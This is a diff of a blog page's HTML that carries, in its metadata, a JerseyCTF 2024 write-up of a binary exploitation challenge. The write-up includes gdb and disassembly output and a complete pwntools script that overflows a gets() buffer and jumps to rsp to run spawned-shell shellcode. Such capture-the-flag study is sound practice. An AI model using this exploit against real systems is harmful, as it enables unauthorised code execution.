@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>JerseyCTF 2024 - pwn/running-on-prayers | CTF Writeups</title>
 <meta name="keywords" content="">
 <meta name="description" content="We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challenge. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.
 checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments The binary itself is very minimal, There is a main function that calls a vuln function.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/posts/jersey-ctf-2024-running-on-prayers/">
+<link rel="canonical" href="https://dfoudeh.github.io/posts/jersey-ctf-2024-running-on-prayers/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://dfoudeh.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dfoudeh.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://dfoudeh.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://dfoudeh.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://dfoudeh.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/jersey-ctf-2024-running-on-prayers/">
+<link rel="alternate" hreflang="en" href="https://dfoudeh.github.io/posts/jersey-ctf-2024-running-on-prayers/">
 <noscript>
     <style>
         #theme-toggle,
@@ -56,7 +56,69 @@ checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#3
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="JerseyCTF 2024 - pwn/running-on-prayers" />
+<meta property="og:description" content="We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challenge. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.
+checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments The binary itself is very minimal, There is a main function that calls a vuln function." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dfoudeh.github.io/posts/jersey-ctf-2024-running-on-prayers/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-24T18:51:51-04:00" />
+<meta property="article:modified_time" content="2024-03-24T18:51:51-04:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="JerseyCTF 2024 - pwn/running-on-prayers"/>
+<meta name="twitter:description" content="We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challenge. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.
+checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments The binary itself is very minimal, There is a main function that calls a vuln function."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://dfoudeh.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "JerseyCTF 2024 - pwn/running-on-prayers",
+      "item": "https://dfoudeh.github.io/posts/jersey-ctf-2024-running-on-prayers/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "JerseyCTF 2024 - pwn/running-on-prayers",
+  "name": "JerseyCTF 2024 - pwn\/running-on-prayers",
+  "description": "We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challenge. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.\nchecksec --file RunningOnPrayers [*] \u0026#39;/home/df00/Desktop/RunningOnPrayers\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments The binary itself is very minimal, There is a main function that calls a vuln function.",
+  "keywords": [
+    
+  ],
+  "articleBody": "We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challenge. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.\nchecksec --file RunningOnPrayers [*] '/home/df00/Desktop/RunningOnPrayers' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments The binary itself is very minimal, There is a main function that calls a vuln function. We use gets to read into a buffer, and that gives us our buffer overflow.\nundefined8 vuln(void) { char local_28 [32]; printf(\"The hard part is not finding the vulnerability, but actually doing something with it\"); gets(local_28); return 0; } I used ROPGadget to search for gadgets that we can use. Unfortunetly, no ‘pop rdi’ as that would have made things very easy. Given that we probably need to execute shellcode in this challenge, call and jmp would be useful gadets.\nROPgadget --binary RunningOnPrayers | grep \"call\" 0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax 0x000000000040103e : call qword ptr [rax - 0x5e1f00d] 0x0000000000401014 : call rax 0x0000000000401012 : je 0x401016 ; call rax 0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d] 0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax 0x000000000040100f : test rax, rax ; je 0x401016 ; call rax ROPgadget --binary RunningOnPrayers | grep \"jmp\" 0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020 0x0000000000401038 : add dl, dh ; jmp 0x401020 0x0000000000401173 : cli ; jmp 0x401100 0x0000000000401170 : endbr64 ; jmp 0x401100 0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax 0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax 0x000000000040103a : jmp 0x401020 0x0000000000401174 : jmp 0x401100 0x000000000040100b : jmp 0x4840103f 0x00000000004010ec : jmp rax 0x0000000000401231 : jmp rsp 0x00000000004010e7 : mov edi, 0x404040 ; jmp rax 0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100 0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax 0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax 0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax Given that we have both jmp rax and call rax, my first thought was that we could use that. Lets overflow the buffer and take a look with GDB to see what happens.\n[ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x007fffffffdfe0 → \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\" $rbx : 0x0 $rcx : 0x007ffff7e1aaa0 → 0x00000000fbad208b $rdx : 0x1 $rsp : 0x007fffffffdfe0 → \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\" $rbp : 0x007fffffffe000 → \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" $rsi : 0x1 $rdi : 0x007ffff7e1ca80 → 0x0000000000000000 $rip : 0x000000004011a7 → mov eax, 0x0 $r8 : 0x0 $r9 : 0x0 $r10 : 0x007ffff7c09c78 → 0x000f0022000043b3 $r11 : 0x246 $r12 : 0x007fffffffe128 → 0x007fffffffe448 → \"/home/df00/Desktop/RunningOnPrayers\" $r13 : 0x000000004011ae → endbr64 $r14 : 0x00000000403e18 → 0x00000000401140 → \u003c__do_global_dtors_aux+0\u003e endbr64 $r15 : 0x007ffff7ffd040 → 0x007ffff7ffe2e0 → 0x0000000000000000 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 Here I just overflowed the buffer with all A’s, but we see that our input is in rax. So if we fill our buffer with shellcode and call rax, it should execute right? Unfortunetly it won’t. At vuln+49 right before we return, eax (lower 32 bits of rax) is set to zero.\ngef➤ disas vuln Dump of assembler code for function vuln: 0x0000000000401176 \u003c+0\u003e:\tendbr64 0x000000000040117a \u003c+4\u003e:\tpush rbp 0x000000000040117b \u003c+5\u003e:\tmov rbp,rsp 0x000000000040117e \u003c+8\u003e:\tsub rsp,0x20 0x0000000000401182 \u003c+12\u003e:\tlea rax,[rip+0xe7f] # 0x402008 0x0000000000401189 \u003c+19\u003e:\tmov rdi,rax 0x000000000040118c \u003c+22\u003e:\tmov eax,0x0 0x0000000000401191 \u003c+27\u003e:\tcall 0x401060 0x0000000000401196 \u003c+32\u003e:\tlea rax,[rbp-0x20] 0x000000000040119a \u003c+36\u003e:\tmov rdi,rax 0x000000000040119d \u003c+39\u003e:\tmov eax,0x0 0x00000000004011a2 \u003c+44\u003e:\tcall 0x401070 =\u003e 0x00000000004011a7 \u003c+49\u003e:\tmov eax,0x0 0x00000000004011ac \u003c+54\u003e:\tleave 0x00000000004011ad \u003c+55\u003e:\tret End of assembler dump. The other gadget that we can use is jmp rsp, and looking above we see that out input is also in rsp.\n0x0000000000401231 : jmp rsp rsp will point at the thing after the return pointer once ret has occured, so our shellcode will go right after jmp rsp.\nThe final solve script. Unfortunetly, the netcat port was down for almost the whole CTF, but as they say - it worked on my machine :)\nfrom pwn import * elf = ELF(\"./RunningOnPrayers\") context.binary = elf context.log_level = \"DEBUG\" libc = elf.libc target = process(\"./RunningOnPrayers\") target.recvuntil(\"it\") jmp_rsp = next(elf.search(asm('jmp rsp'))) payload = flat( 'A' * 0x28, jmp_rsp, asm(shellcraft.sh()) ) target.sendline(payload) target.interactive() ",
+  "wordCount" : "775",
+  "inLanguage": "en",
+  "datePublished": "2024-03-24T18:51:51-04:00",
+  "dateModified": "2024-03-24T18:51:51-04:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://dfoudeh.github.io/posts/jersey-ctf-2024-running-on-prayers/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://dfoudeh.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -74,7 +136,7 @@ checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#3
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
+            <a href="https://dfoudeh.github.io/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -239,7 +301,7 @@ checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#3
     </main>
     
 <footer class="footer">
-    <span>&copy; 2024 <a href="http://localhost:1313/">CTF Writeups</a></span>
+    <span>&copy; 2024 <a href="https://dfoudeh.github.io/">CTF Writeups</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
